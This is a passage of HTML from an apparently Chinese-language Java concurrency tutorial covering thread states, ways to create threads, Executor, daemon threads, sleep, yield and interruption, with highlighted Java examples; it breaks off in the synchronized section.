href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%B9%B6%E5%8F%91.md#await-signal-signalall">await() signal() signalAll()</a></li></ul></li><li>七、J.U.C - AQS<ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%B9%B6%E5%8F%91.md#countdownlatch">CountdownLatch</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%B9%B6%E5%8F%91.md#cyclicbarrier">CyclicBarrier</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%B9%B6%E5%8F%91.md#semaphore">Semaphore</a></li></ul></li><li>八、J.U.C - 其它组件<ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%B9%B6%E5%8F%91.md#futuretask">FutureTask</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%B9%B6%E5%8F%91.md#blockingqueue">BlockingQueue</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%B9%B6%E5%8F%91.md#forkjoin">ForkJoin</a></li></ul></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%B9%B6%E5%8F%91.md#%E4%B9%9D%E7%BA%BF%E7%A8%8B%E4%B8%8D%E5%AE%89%E5%85%A8%E7%A4%BA%E4%BE%8B">九、线程不安全示例</a></li><li>十、Java 内存模型<ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%B9%B6%E5%8F%91.md#%E4%B8%BB%E5%86%85%E5%AD%98%E4%B8%8E%E5%B7%A5%E4%BD%9C%E5%86%85%E5%AD%98">主内存与工作内存</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%B9%B6%E5%8F%91.md#%E5%86%85%E5%AD%98%E9%97%B4%E4%BA%A4%E4%BA%92%E6%93%8D%E4%BD%9C">内存间交互操作</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%B9%B6%E5%8F%91.md#%E5%86%85%E5%AD%98%E6%A8%A1%E5%9E%8B%E4%B8%89%E5%A4%A7%E7%89%B9%E6%80%A7">内存模型三大特性</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%B9%B6%E5%8F%91.md#%E5%85%88%E8%A1%8C%E5%8F%91%E7%94%9F%E5%8E%9F%E5%88%99">先行发生原则</a></li></ul></li><li>十一、线程安全<ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%B9%B6%E5%8F%91.md#%E4%B8%8D%E5%8F%AF%E5%8F%98">不可变</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%B9%B6%E5%8F%91.md#%E4%BA%92%E6%96%A5%E5%90%8C%E6%AD%A5">互斥同步</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%B9%B6%E5%8F%91.md#%E9%9D%9E%E9%98%BB%E5%A1%9E%E5%90%8C%E6%AD%A5">非阻塞同步</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%B9%B6%E5%8F%91.md#%E6%97%A0%E5%90%8C%E6%AD%A5%E6%96%B9%E6%A1%88">无同步方案</a></li></ul></li><li>十二、锁优化<ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%B9%B6%E5%8F%91.md#%E8%87%AA%E6%97%8B%E9%94%81">自旋锁</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%B9%B6%E5%8F%91.md#%E9%94%81%E6%B6%88%E9%99%A4">锁消除</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%B9%B6%E5%8F%91.md#%E9%94%81%E7%B2%97%E5%8C%96">锁粗化</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%B9%B6%E5%8F%91.md#%E8%BD%BB%E9%87%8F%E7%BA%A7%E9%94%81">轻量级锁</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%B9%B6%E5%8F%91.md#%E5%81%8F%E5%90%91%E9%94%81">偏向锁</a></li></ul></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%B9%B6%E5%8F%91.md#%E5%8D%81%E4%B8%89%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%BC%80%E5%8F%91%E8%89%AF%E5%A5%BD%E7%9A%84%E5%AE%9E%E8%B7%B5">十三、多线程开发良好的实践</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%B9%B6%E5%8F%91.md#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99">参考资料</a></li></ul><h1 id="一、线程状态转换"><a href="#一、线程状态转换" class="headerlink" title="一、线程状态转换"></a>一、线程状态转换</h1><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/ace830df-9919-48ca-91b5-60b193f593d2.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/ace830df-9919-48ca-91b5-60b193f593d2.png" alt="img"></a></p><h2 id="新建（New）"><a href="#新建（New）" class="headerlink" title="新建（New）"></a>新建（New）</h2><p>创建后尚未启动。</p><h2 id="可运行（Runnable）"><a href="#可运行（Runnable）" class="headerlink" title="可运行（Runnable）"></a>可运行（Runnable）</h2><p>可能正在运行，也可能正在等待 CPU 时间片。</p><p>包含了操作系统线程状态中的 Running 和 Ready。</p><h2 id="阻塞（Blocking）"><a href="#阻塞（Blocking）" class="headerlink" title="阻塞（Blocking）"></a>阻塞（Blocking）</h2><p>等待获取一个排它锁，如果其线程释放了锁就会结束此状态。</p><h2 id="无限期等待（Waiting）"><a href="#无限期等待（Waiting）" class="headerlink" title="无限期等待（Waiting）"></a>无限期等待（Waiting）</h2><p>等待其它线程显式地唤醒，否则不会被分配 CPU 时间片。</p><table><thead><tr><th>进入方法</th><th>退出方法</th></tr></thead><tbody><tr><td>没有设置 Timeout 参数的 Object.wait() 方法</td><td>Object.notify() / Object.notifyAll()</td></tr><tr><td>没有设置 Timeout 参数的 Thread.join() 方法</td><td>被调用的线程执行完毕</td></tr><tr><td>LockSupport.park() 方法</td><td>-</td></tr></tbody></table><h2 id="限期等待（Timed-Waiting）"><a href="#限期等待（Timed-Waiting）" class="headerlink" title="限期等待（Timed Waiting）"></a>限期等待（Timed Waiting）</h2><p>无需等待其它线程显式地唤醒，在一定时间之后会被系统自动唤醒。</p><p>调用 Thread.sleep() 方法使线程进入限期等待状态时，常常用“使一个线程睡眠”进行描述。</p><p>调用 Object.wait() 方法使线程进入限期等待或者无限期等待时，常常用“挂起一个线程”进行描述。</p><p>睡眠和挂起是用来描述行为，而阻塞和等待用来描述状态。</p><p>阻塞和等待的区别在于，阻塞是被动的，它是在等待获取一个排它锁。而等待是主动的，通过调用 Thread.sleep() 和 Object.wait() 等方法进入。</p><table><thead><tr><th>进入方法</th><th>退出方法</th></tr></thead><tbody><tr><td>Thread.sleep() 方法</td><td>时间结束</td></tr><tr><td>设置了 Timeout 参数的 Object.wait() 方法</td><td>时间结束 / Object.notify() / Object.notifyAll()</td></tr><tr><td>设置了 Timeout 参数的 Thread.join() 方法</td><td>时间结束 / 被调用的线程执行完毕</td></tr><tr><td>LockSupport.parkNanos() 方法</td><td>-</td></tr><tr><td>LockSupport.parkUntil() 方法</td><td>-</td></tr></tbody></table><h2 id="死亡（Terminated）"><a href="#死亡（Terminated）" class="headerlink" title="死亡（Terminated）"></a>死亡（Terminated）</h2><p>可以是线程结束任务之后自己结束，或者产生了异常而结束。</p><h1 id="二、使用线程"><a href="#二、使用线程" class="headerlink" title="二、使用线程"></a>二、使用线程</h1><p>有三种使用线程的方法：</p><ul><li>实现 Runnable 接口；</li><li>实现 Callable 接口；</li><li>继承 Thread 类。</li></ul><p>实现 Runnable 和 Callable 接口的类只能当做一个可以在线程中运行的任务，不是真正意义上的线程，因此最后还需要通过 Thread 来调用。可以说任务是通过线程驱动从而执行的。</p><h2 id="实现-Runnable-接口"><a href="#实现-Runnable-接口" class="headerlink" title="实现 Runnable 接口"></a>实现 Runnable 接口</h2><p>需要实现 run() 方法。</p><p>通过 Thread 调用 start() 方法来启动线程。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyRunnable</span> <span class="token keyword">implements</span> <span class="token class-name">Runnable</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// ...</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>    MyRunnable instance <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyRunnable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    Thread thread <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span>instance<span class="token punctuation">)</span><span class="token punctuation">;</span>    thread<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="实现-Callable-接口"><a href="#实现-Callable-接口" class="headerlink" title="实现 Callable 接口"></a>实现 Callable 接口</h2><p>与 Runnable 相比，Callable 可以有返回值，返回值通过 FutureTask 进行封装。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyCallable</span> <span class="token keyword">implements</span> <span class="token class-name">Callable</span><span class="token operator">&lt;</span>Integer<span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> Integer <span class="token function">call</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token number">123</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> ExecutionException<span class="token punctuation">,</span> InterruptedException <span class="token punctuation">{</span>    MyCallable mc <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyCallable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    FutureTask<span class="token operator">&lt;</span>Integer<span class="token operator">></span> ft <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FutureTask</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span>mc<span class="token punctuation">)</span><span class="token punctuation">;</span>    Thread thread <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span>ft<span class="token punctuation">)</span><span class="token punctuation">;</span>    thread<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>ft<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="继承-Thread-类"><a href="#继承-Thread-类" class="headerlink" title="继承 Thread 类"></a>继承 Thread 类</h2><p>同样也是需要实现 run() 方法，因为 Thread 类也实现了 Runable 接口。</p><p>当调用 start() 方法启动一个线程时，虚拟机会将该线程放入就绪队列中等待被调度，当一个线程被调度时会执行该线程的 run() 方法。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyThread</span> <span class="token keyword">extends</span> <span class="token class-name">Thread</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// ...</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>    MyThread mt <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    mt<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="实现接口-VS-继承-Thread"><a href="#实现接口-VS-继承-Thread" class="headerlink" title="实现接口 VS 继承 Thread"></a>实现接口 VS 继承 Thread</h2><p>实现接口会更好一些，因为：</p><ul><li>Java 不支持多重继承，因此继承了 Thread 类就无法继承其它类，但是可以实现多个接口；</li><li>类可能只要求可执行就行，继承整个 Thread 类开销过大。</li></ul><h1 id="三、基础线程机制"><a href="#三、基础线程机制" class="headerlink" title="三、基础线程机制"></a>三、基础线程机制</h1><h2 id="Executor"><a href="#Executor" class="headerlink" title="Executor"></a>Executor</h2><p>Executor 管理多个异步任务的执行，而无需程序员显式地管理线程的生命周期。这里的异步是指多个任务的执行互不干扰，不需要进行同步操作。</p><p>主要有三种 Executor：</p><ul><li>CachedThreadPool：一个任务创建一个线程；</li><li>FixedThreadPool：所有任务只能使用固定大小的线程；</li><li>SingleThreadExecutor：相当于大小为 1 的 FixedThreadPool。</li></ul><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>    ExecutorService executorService <span class="token operator">=</span> Executors<span class="token punctuation">.</span><span class="token function">newCachedThreadPool</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        executorService<span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">MyRunnable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    executorService<span class="token punctuation">.</span><span class="token function">shutdown</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="Daemon"><a href="#Daemon" class="headerlink" title="Daemon"></a>Daemon</h2><p>守护线程是程序运行时在后台提供服务的线程，不属于程序中不可或缺的部分。</p><p>当所有非守护线程结束时，程序也就终止，同时会杀死所有守护线程。</p><p>main() 属于非守护线程。</p><p>使用 setDaemon() 方法将一个线程设置为守护线程。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>    Thread thread <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">MyRunnable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    thread<span class="token punctuation">.</span><span class="token function">setDaemon</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="sleep"><a href="#sleep" class="headerlink" title="sleep()"></a>sleep()</h2><p>Thread.sleep(millisec) 方法会休眠当前正在执行的线程，millisec 单位为毫秒。</p><p>sleep() 可能会抛出 InterruptedException，因为异常不能跨线程传播回 main() 中，因此必须在本地进行处理。线程中抛出的其它异常也同样需要在本地进行处理。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>        Thread<span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>        e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h2 id="yield"><a href="#yield" class="headerlink" title="yield()"></a>yield()</h2><p>对静态方法 Thread.yield() 的调用声明了当前线程已经完成了生命周期中最重要的部分，可以切换给其它线程来执行。该方法只是对线程调度器的一个建议，而且也只是建议具有相同优先级的其它线程可以运行。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    Thread<span class="token punctuation">.</span><span class="token function">yield</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h1 id="四、中断"><a href="#四、中断" class="headerlink" title="四、中断"></a>四、中断</h1><p>一个线程执行完毕之后会自动结束，如果在运行过程中发生异常也会提前结束。</p><h2 id="InterruptedException"><a href="#InterruptedException" class="headerlink" title="InterruptedException"></a>InterruptedException</h2><p>通过调用一个线程的 interrupt() 来中断该线程，如果该线程处于阻塞、限期等待或者无限期等待状态，那么就会抛出 InterruptedException，从而提前结束该线程。但是不能中断 I/O 阻塞和 synchronized 锁阻塞。</p><p>对于以下代码，在 main() 中启动一个线程之后再中断它，由于线程中调用了 Thread.sleep() 方法，因此会抛出一个 InterruptedException，从而提前结束线程，不执行之后的语句。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">InterruptExample</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">MyThread1</span> <span class="token keyword">extends</span> <span class="token class-name">Thread</span> <span class="token punctuation">{</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">try</span> <span class="token punctuation">{</span>                Thread<span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Thread run"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> InterruptedException <span class="token punctuation">{</span>    Thread thread1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyThread1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    thread1<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    thread1<span class="token punctuation">.</span><span class="token function">interrupt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Main run"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>Main runjava<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>InterruptedException<span class="token operator">:</span> sleep interrupted    at java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span>Native Method<span class="token punctuation">)</span>    at InterruptExample<span class="token punctuation">.</span>lambda$main$<span class="token function">0</span><span class="token punctuation">(</span>InterruptExample<span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">5</span><span class="token punctuation">)</span>    at InterruptExample$$Lambda$<span class="token number">1</span><span class="token operator">/</span><span class="token number">713338599</span><span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span>Unknown Source<span class="token punctuation">)</span>    at java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span>Thread<span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">745</span><span class="token punctuation">)</span></code></pre><h2 id="interrupted"><a href="#interrupted" class="headerlink" title="interrupted()"></a>interrupted()</h2><p>如果一个线程的 run() 方法执行一个无限循环，并且没有执行 sleep() 等会抛出 InterruptedException 的操作，那么调用线程的 interrupt() 方法就无法使线程提前结束。</p><p>但是调用 interrupt() 方法会设置线程的中断标记，此时调用 interrupted() 方法会返回 true。因此可以在循环体中使用 interrupted() 方法来判断线程是否处于中断状态，从而提前结束线程。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">InterruptExample</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">MyThread2</span> <span class="token keyword">extends</span> <span class="token class-name">Thread</span> <span class="token punctuation">{</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">interrupted</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// ..</span>            <span class="token punctuation">}</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Thread end"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> InterruptedException <span class="token punctuation">{</span>    Thread thread2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyThread2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    thread2<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    thread2<span class="token punctuation">.</span><span class="token function">interrupt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>Thread end</code></pre><h2 id="Executor-的中断操作"><a href="#Executor-的中断操作" class="headerlink" title="Executor 的中断操作"></a>Executor 的中断操作</h2><p>调用 Executor 的 shutdown() 方法会等待线程都执行完毕之后再关闭，但是如果调用的是 shutdownNow() 方法，则相当于调用每个线程的 interrupt() 方法。</p><p>以下使用 Lambda 创建线程，相当于创建了一个匿名内部线程。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>    ExecutorService executorService <span class="token operator">=</span> Executors<span class="token punctuation">.</span><span class="token function">newCachedThreadPool</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    executorService<span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            Thread<span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Thread run"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    executorService<span class="token punctuation">.</span><span class="token function">shutdownNow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Main run"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>Main runjava<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>InterruptedException<span class="token operator">:</span> sleep interrupted    at java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span>Native Method<span class="token punctuation">)</span>    at ExecutorInterruptExample<span class="token punctuation">.</span>lambda$main$<span class="token function">0</span><span class="token punctuation">(</span>ExecutorInterruptExample<span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">9</span><span class="token punctuation">)</span>    at ExecutorInterruptExample$$Lambda$<span class="token number">1</span><span class="token operator">/</span><span class="token number">1160460865</span><span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span>Unknown Source<span class="token punctuation">)</span>    at java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>ThreadPoolExecutor<span class="token punctuation">.</span><span class="token function">runWorker</span><span class="token punctuation">(</span>ThreadPoolExecutor<span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">1142</span><span class="token punctuation">)</span>    at java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>ThreadPoolExecutor$Worker<span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span>ThreadPoolExecutor<span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">617</span><span class="token punctuation">)</span>    at java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span>Thread<span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">745</span><span class="token punctuation">)</span></code></pre><p>如果只想中断 Executor 中的一个线程，可以通过使用 submit() 方法来提交一个线程，它会返回一个 Future&lt;?&gt; 对象，通过调用该对象的 cancel(true) 方法就可以中断线程。</p><pre class=" language-java"><code class="language-java">Future<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> future <span class="token operator">=</span> executorService<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// ..</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>future<span class="token punctuation">.</span><span class="token function">cancel</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h1 id="五、互斥同步"><a href="#五、互斥同步" class="headerlink" title="五、互斥同步"></a>五、互斥同步</h1><p>Java 提供了两种锁机制来控制多个线程对共享资源的互斥访问，第一个是 JVM 实现的 synchronized，而另一个是 JDK 实现的 ReentrantLock。</p><h2 id="synchronized"><a href="#synchronized" class="headerlink" title="synchronized"></a>synchronized</h2><p><strong>1. 同步一个代码块</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">synchronized</span> 